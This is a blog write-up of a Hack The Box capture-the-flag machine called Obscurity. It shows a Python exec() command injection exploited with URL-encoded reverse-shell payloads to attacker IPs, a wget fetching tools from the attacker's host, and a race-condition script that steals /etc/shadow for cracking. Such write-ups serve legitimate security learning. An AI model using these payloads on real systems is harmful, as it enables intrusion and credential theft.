<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
  content="Brian G. ">
<meta name="description"
  content="Welcome to another Forest Hex hacking adventure! üå≤üèπ Today I will be hacking an HTB box named Obscurity.
 This one is leaning more towards CTF style than real world, let&amp;rsquo;s see if I can manage to figure it out.
As always, feel free to jump around.
  Port Scan Checking out the Web Server The Web Server Script Popping the Reverse Shell Getting User Getting Root Getting Root Another Way   Port Scan nmap -p- -sC -sV --min-rate=1000 -T4 10." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://foresthex.com/posts/hack-the-box-obscurity/" />


<title>
  
  Hack The Box - Obscurity :: Forest Hex  ‚Äî An exploration of hacking and programming.
  
</title>




<script async src="https://www.googletagmanager.com/gtag/js?id=UA-148164972-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() { dataLayer.push(arguments); }
  gtag('js', new Date());

  gtag('config', 'UA-148164972-1');
</script>


<link href="https://foresthex.com/flag-icon.min.css" rel="stylesheet" type="text/css">



<link rel="stylesheet" href="https://foresthex.com/main.min.bb5519c9e00fc0c254312c28c9a1478d2dd72eea45317a8fe6c9ed612e1fe53d.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://foresthex.com/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://foresthex.com/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://foresthex.com/favicon-16x16.png">
    <link rel="manifest" href="https://foresthex.com/site.webmanifest">
    <link rel="mask-icon" href="https://foresthex.com/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://foresthex.com/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">

<meta itemprop="name" content="Hack The Box - Obscurity">
<meta itemprop="description" content="A wonderland of custom exploitation.">
<meta itemprop="datePublished" content="2020-05-30T00:00:00+00:00" />
<meta itemprop="dateModified" content="2020-05-30T00:00:00+00:00" />
<meta itemprop="wordCount" content="1909">



<meta itemprop="keywords" content="ctf,HackTheBox,custom exploitation,python,command injection,cracking," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Obscurity"/>
<meta name="twitter:description" content="A wonderland of custom exploitation."/>





<meta property="article:published_time" content="2020-05-30 00:00:00 &#43;0000 UTC" />






<meta name="twitter:image" content="https://foresthex.com/posts/hack-the-box-obscurity/1576081212.png" />
<meta name="itemprop:image" content="https://foresthex.com/posts/hack-the-box-obscurity/1576081212.png" />
<meta name="twitter:card" content="summary_large_image">
    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://foresthex.com/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text" style="font-family:consolas;">$ cd /home</span>
            <span class="logo__cursor" style="background-color:#3f913d"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://foresthex.com/about/">about</a></li><li><a href="https://foresthex.com/tags/">tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>9 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title">
                <a href="https://foresthex.com/posts/hack-the-box-obscurity/">Hack The Box - Obscurity</a>
            </h1>

            

            <div class="post-content">
                <h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! üå≤üèπ</h3>
<p><em>Today I will be hacking an HTB box named Obscurity.</em></p>

    <figure class="left" >
        <img src="1576081212.png"   />

        
    </figure>


<p>This one is leaning more towards CTF style than real world, let&rsquo;s see if I can manage to figure it out.</p>
<p>As always, feel free to jump around.</p>
<hr>
<ul>
<li><a href="#port-scan">Port Scan</a></li>
<li><a href="#checking-out-the-web-server">Checking out the Web Server</a></li>
<li><a href="#the-web-server-script">The Web Server Script</a></li>
<li><a href="#popping-the-reverse-shell">Popping the Reverse Shell</a></li>
<li><a href="#getting-user">Getting User</a></li>
<li><a href="#getting-root">Getting Root</a></li>
<li><a href="#getting-root-another-way">Getting Root Another Way</a></li>
</ul>
<hr>
<h1 id="port-scan">Port Scan</h1>
<p><code>nmap -p- -sC -sV --min-rate=1000 -T4 10.10.10.168</code></p>

    <figure class="left" >
        <img src="1576081605.png"   />

        
            <figcaption class="center" >Port Scan</figcaption>
        
    </figure>


<p>It found a standard SSH port open, and an http server called &ldquo;BadHTTPServer&rdquo;, never heard of it. Time to check it out this server.</p>
<hr>
<h1 id="investigating-the-web-server">Investigating the Web Server</h1>

    <figure class="left" >
        <img src="1576082234.png"   />

        
            <figcaption class="center" >Web Page</figcaption>
        
    </figure>


<p>Interesting, it sounds like this box will be all about custom exploits. That&rsquo;s pretty neat, and I see our first hint at the bottom of the page:</p>
<p><code>Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory</code></p>
<p>I can run gobuster to try and find this file and I&rsquo;m guessing the source code will have a vulnerability to exploit.</p>
<p>On top of that I have a user: <code>secure@obscure.htb</code></p>
<p>Finally, it says they rolled their own:</p>
<ol>
<li>Encryption</li>
<li>Web Server</li>
<li>SSH replacement</li>
</ol>
<p>That will be good to keep in mind when I get stuck.</p>
<p>I started up gobuster, but immediately ran into an error:
<code>Unsolicited response received on idle HTTP channel starting with &quot;\n&quot;; err=&lt;nil&gt;</code></p>
<p>I did a bit of research and realized wfuzz would be better suited to the task. I could create a URL like so:
<code>http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></p>
<p>Running that command with a wordlist will replace the word FUZZ with the word from the list. Unfortunately it kept having a fatal error where the HTTP response was empty. I decided to look for another tool and came across FFUF:
<a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p>
<p>This program functions similar to WFUZZ, and I managed to find the script with it.
<code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code></p>
<p>I navigated to the page and was rewarded with the full script.</p>
<hr>
<h1 id="the-web-server-script">The Web Server Script</h1>
<p>Here&rsquo;s a version of the script stripped down to parts important to the exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> subprocess

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
    <span style="color:#66d9ef">def</span> __init__(self, request):
        <span style="color:#66d9ef">try</span>:
            request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
            self<span style="color:#f92672">.</span>doc <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;doc&#34;</span>]

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseRequest</span>(self, request):
        req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        method,doc,vers <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serveDoc</span>(self, path, docRoot):
    path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
    <span style="color:#66d9ef">try</span>:
        info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
        <span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
</code></pre></div><p>That looks like it&rsquo;s formatting the document path, and executing it.
I can abuse this by injecting python that <code>exec()</code> will execute. This means I should be able to invoke a reverse shell if I inject it correctly.</p>
<p>How do I manipulate the path variable? Let&rsquo;s follow the logic in reverse:</p>
<hr>
<p>This is where the path variable is passed, it will be whatever is in request.doc</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(request<span style="color:#f92672">.</span>doc, DOC_ROOT)
</code></pre></div><hr>
<p>This is where the request data is handled. It&rsquo;s decoded from raw bytes into an ascii string.
There is an  issue though:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</code></pre></div><p>This is executed when a new request object is initialized. I need to use <code>\n</code> to get my own code to execture.
Luckily I can get around this problem because of this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
</code></pre></div><p>According to the documentation here: <a href="https://docs.python.org/3/library/urllib.parse.html">https://docs.python.org/3/library/urllib.parse.html</a></p>
<p><code>Example: unquote('/El%20Ni%C3%B1o/') yields '/El Ni√±o/'.</code></p>
<p>I can use the <code>%xx</code> notation to insert <code>\n</code> that won&rsquo;t be removed by the strip function above.
The hex representation of a <code>\n</code> is <code>0A</code>, so I can inject code using <code>%0A</code> to insert a new line.</p>
<p>There&rsquo;s an easy way to run system commands using python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;wget http://10.10.14.6:8000/socat&#34;</span>)
</code></pre></div><p>That particular command downloads socat. I sometimes use a static socat binary to get a full TTY shell. In this case it&rsquo;s a nice way to test if the command injection works too since it will notify me when there&rsquo;s a download.</p>
<p>To inject that command I have to format it correctly. It has to be on the first line of the HTTP request, in the third space.
On top of that it can&rsquo;t have a newline character, but it can have <code>%0A</code> which will later be interperted as a new line.</p>
<p>If I send the payload:
<code>a'%0Aos.system(&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&quot;)#</code></p>
<p>Python will execute it as:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Document: a&#39;</span>
os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#34;</span>)<span style="color:#75715e">#&#39;</span>
</code></pre></div><p>It should just allow me to navigate there, but it&rsquo;s not working. I&rsquo;m going to run a local copy of the server and debug it to see what&rsquo;s happening.</p>
<hr>
<h1 id="popping-the-reverse-shell">Popping the Reverse Shell</h1>
<p>After poking around locally I determined two things:</p>
<ol>
<li>All commands must begin with <code>'%0A</code> to start a new line.</li>
<li>The last character must be <code>%23</code>, which converts to <code>#</code> which will comment out the final single quote</li>
</ol>
<p>I couldn&rsquo;t get the normal bash reverse shell to work, but I did get a python one working.</p>
<p>Here&rsquo;s the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;10.10.29.6&#39;</span>,<span style="color:#ae81ff">8440</span>))
os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
<span style="color:#f92672">import</span> pty
pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
</code></pre></div><p>To inject this code it must have every new line changed into <code>%0A</code>, be prepended by a single quote followed by <code>%0A</code>, and appended with <code>%23</code>. The end result is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">test<span style="color:#e6db74">&#39;%0As=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0As.connect((&#39;</span>10.10.14.29<span style="color:#e6db74">&#39;,8440))%0Aos.dup2(s.fileno(),0)%0Aos.dup2(s.fileno(),1)%0Aos.dup2(s.fileno(),2)%0Aimport%20pty%0Apty.spawn(&#39;</span>/bin/bash<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>%23
</code></pre></div><p>It works!</p>

    <figure class="left" >
        <img src="1576170621.png"   />

        
            <figcaption class="center" >Got a limited shell</figcaption>
        
    </figure>


<hr>
<h1 id="getting-user">Getting User</h1>
<p>Navigating to the home directory of robert shows a lot of interesting stuff:

    <figure class="left" >
        <img src="1576170738.png"   />

        
    </figure>

</p>
<p>passwordreminder.txt:
<code>¬¥√ë√à√å√â√†√ô√Å√ë√©¬Ø¬∑¬øk</code></p>
<p>check.txt
<code>Encrypting this file with your key should result in out.txt, make sure your key is correct!</code></p>
<p>out.txt
<code>¬¶√ö√à√™√ö√û√ò√õ√ù√ù¬â√ó√ê√ä√ü¬Ö√û√ä√ö√â¬í√¶√ü√ù√ã¬à√ö√õ√ö√™¬Å√ô√â√´¬è√©√ë√í√ù√ç√ê¬Ö√™√Ü√°√ô√û√£¬ñ√í√ë¬à√ê√°√ô¬¶√ï√¶√ò¬û¬è√£√ä√é√ç¬Å√ü√ö√™√Ü¬é√ù√°√§√®¬â√é√ç√ö¬å√é√´¬Å√ë√ì√§√°√õ√å√ó¬â¬Åv</code></p>
<p>If I had to guess, <code>out.txt</code> is the encrypted version of <code>check.txt</code>, using the <code>SuperSecureCrypt.py</code> script. The encryption is pretty simple:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
    keylen <span style="color:#f92672">=</span> len(key)
    keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
        keyChr <span style="color:#f92672">=</span> key[keyPos]
        newChr <span style="color:#f92672">=</span> ord(x)
        newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">+</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
        encrypted <span style="color:#f92672">+=</span> newChr
        keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
    <span style="color:#66d9ef">return</span> encrypted
</code></pre></div><p>It iterates through the string to be encrypted and does the following:</p>
<ol>
<li>Grabs the first character of the key, and unencrypted string.</li>
<li>Gets the ordinal value of both using (ord), and adds them together.</li>
<li>Does a modulous operation against 255, this ensure the value stays below 255.</li>
</ol>
<p>Looking at the encryption it became clear that multiple valid keys could be used due to the modulous operation performed. Through some trial and error I determined the following algorithim to derive a valid key:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> enc_ord &gt; unenc_ord
enc_ord - unenc_ord <span style="color:#f92672">=</span> key_ord

<span style="color:#66d9ef">if</span> enc_ord &gt; unenc_ord
enc_ord + <span style="color:#ae81ff">255</span> - unenc_ord <span style="color:#f92672">=</span> key_ord
</code></pre></div><p>Now it&rsquo;s time to turn concept into reality. There&rsquo;s a catch though&hellip;</p>
<p>When dealing with encryption you can end up with non-printable characters. This is why the output of out.txt looks so wonky, it&rsquo;s got some bytes in there that don&rsquo;t translate to a pretty character.</p>
<p>The solution is to ensure we are working on the bytes in python. This can easily be achieved by reading the data from the files themselves rather than copy and pasting values, which could screw up some of the special characters.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;passwordreminder.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> e_in:
    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;out.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> u_in:
        enc <span style="color:#f92672">=</span> e_in<span style="color:#f92672">.</span>read()
        unenc <span style="color:#f92672">=</span> u_in<span style="color:#f92672">.</span>read()
        key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(unenc)):
            e <span style="color:#f92672">=</span> ord(enc[x])
            u <span style="color:#f92672">=</span> ord(unenc[x])
            <span style="color:#66d9ef">if</span> e <span style="color:#f92672">&gt;</span> u:
                key <span style="color:#f92672">+=</span> chr(e <span style="color:#f92672">-</span> u)
            <span style="color:#66d9ef">else</span>:
                key <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">255</span> <span style="color:#f92672">+</span> e <span style="color:#f92672">-</span> u)

        <span style="color:#66d9ef">print</span>(key)
</code></pre></div>
    <figure class="left" >
        <img src="1579899711610.png"   />

        
            <figcaption class="center" >Success!</figcaption>
        
    </figure>


<p><code>alexandrovichalexandrovich...</code>
That&rsquo;s repeating, so the key is: <code>alexandrovich</code></p>
<blockquote>
<p>Editor&rsquo;s Note:</p>
<p>You might notice I ran this from the <code>robert</code> user account. I actually came back to this box later to update the script. My first iteration simply had the special characters pasted from <code>cat</code> output, and somehow through the magic of VS Code, and Windows Terminal, it kept all the underlying byte values and just worked.</p>
<p>I discovered this isn&rsquo;t the case for every environment and decided to improve my script so it would always work no matter what the environement was.</p>
</blockquote>
<p>Now I should be able to use the script on the box itself since I have execute permissions to find out that reminder.</p>
<p><code>python3 ./SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/a.txt -k alexandrovich</code></p>
<p>Doing so got me this:
<code>SecThruObsFTW</code></p>

    <figure class="left" >
        <img src="1577058738.png"   />

        
    </figure>


<p>I was then able to su in and get user flag:

    <figure class="left" >
        <img src="1577058791.png"   />

        
    </figure>

</p>
<p>On top of that I was able to SSH in using the same password.</p>
<hr>
<h1 id="getting-root">Getting Root</h1>
<p>Running <code>sudo -l</code> returns that I can use the better ssh program as root:</p>

    <figure class="left" >
        <img src="1577062677.png"   />

        
    </figure>


<p>Here&rsquo;s the code for it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> crypt
<span style="color:#f92672">import</span> traceback
<span style="color:#f92672">import</span> subprocess

path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;authenticated&#34;</span>: <span style="color:#ae81ff">0</span>}
<span style="color:#66d9ef">try</span>:
    session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter username: &#34;</span>)
    passW <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter password: &#34;</span>)

    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/etc/shadow&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
    data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> None) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
    passwords <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data:
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x <span style="color:#f92672">==</span> None:
            passwords<span style="color:#f92672">.</span>append(x)

    passwordFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords])
    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
        f<span style="color:#f92672">.</span>write(passwordFile)
    time<span style="color:#f92672">.</span>sleep(<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>)
    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    realPass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords:
        <span style="color:#66d9ef">if</span> p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> session[<span style="color:#e6db74">&#39;user&#39;</span>]:
            salt, realPass <span style="color:#f92672">=</span> p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;$&#39;</span>)[<span style="color:#ae81ff">2</span>:]
            <span style="color:#66d9ef">break</span>

    <span style="color:#66d9ef">if</span> salt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid user&#34;</span>)
        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$6$&#39;</span><span style="color:#f92672">+</span>salt<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;$&#39;</span>
    realPass <span style="color:#f92672">=</span> salt <span style="color:#f92672">+</span> realPass

    hash <span style="color:#f92672">=</span> crypt<span style="color:#f92672">.</span>crypt(passW, salt)

    <span style="color:#66d9ef">if</span> hash <span style="color:#f92672">==</span> realPass:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Authed!&#34;</span>)
        session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Incorrect pass&#34;</span>)
        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>,path))
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
    traceback<span style="color:#f92672">.</span>print_exc()
    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)

<span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
    <span style="color:#66d9ef">while</span> True:
        command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@Obscure$ &#34;</span>)
        cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;sudo&#39;</span>, <span style="color:#e6db74">&#39;-u&#39;</span>,  session[<span style="color:#e6db74">&#39;user&#39;</span>]]
        cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>))
        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)

        o,e <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
</code></pre></div><p>Following the source code I can see it copies the data from /etc/shadow to /tmp/RANDOM.
It deletes it pretty quickly, but I can create a python script to monitor the file system and copy it.
I have <code>.1</code> seconds of sleep after the file is created to grab it.</p>
<p>First I had to create the directory <code>/tmp/SSH</code> with <code>mkdir /tmp/SSH</code>. Then I had to invoke the script using with <code>sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>. Finally, I had to enter a valid username, but any password would do. This would cause the script to copy the shadow file to /tmp, so that my script will catch it and copy it.</p>
<p>The following script did the trick:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> shutil
<span style="color:#66d9ef">while</span> True:
    files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>)
    <span style="color:#66d9ef">if</span> len(files) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Found!&#34;</span>)
        shutil<span style="color:#f92672">.</span>copyfile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>, files[<span style="color:#ae81ff">0</span>]), <span style="color:#e6db74">&#39;/tmp/pass&#39;</span>)
        <span style="color:#66d9ef">break</span>
</code></pre></div>
    <figure class="left" >
        <img src="1577086410.png"   />

        
    </figure>


<p>Now I have the root hash value + salt, I should be able to crack it.</p>
